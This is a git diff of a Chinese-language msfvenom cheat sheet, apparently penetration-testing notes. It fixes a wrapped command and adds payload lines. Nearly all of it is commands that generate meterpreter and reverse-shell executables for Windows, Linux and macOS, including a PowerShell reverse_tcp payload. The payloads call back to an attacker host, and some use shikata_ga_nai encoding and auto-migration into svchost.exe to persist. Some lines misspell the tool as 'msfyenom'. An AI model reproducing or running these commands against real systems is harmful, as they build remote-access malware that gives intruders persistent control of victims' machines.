@@ -23,8 +23,7 @@ msfvenom -l payloads | grep "php" | awk '{print $1}'
 ## payload的可持续化
 - 自动迁移到进程
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true
-PrependMigrateProc=svchost.exe -f exe -o shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o shell.exe
 ```
 
 - 生成的shell程序执行后会启动两个进程shell.exe和svchost.exe,关闭其中一个不会影响会话状态.
@@ -35,11 +34,15 @@ svchost.exe进程,自己测试的时候不建议到这个进程而是其他的�
 诉MSF编码器输出格式为exe,-o选项指定输出的文件名为payload.exe,保存在根自录下.
 
 ## 各平台的 payload
+https://micro8.gitbook.io/micro8/contents-1/1-10/10msfvenom-chang-yong-sheng-cheng-payload-ming-ling
 ```bash
 # Linux
 msfyenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -a x86 --platform Linux -f elf > shell.elf
 # Windows
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -f exe > shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=1234 -f exe > shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1234 -f exe > shell.exe
+msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$ip LPORT=1234  -f raw -o payload.ps1
+
 # Mac
 msfyenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho>shell.macho
 # Android
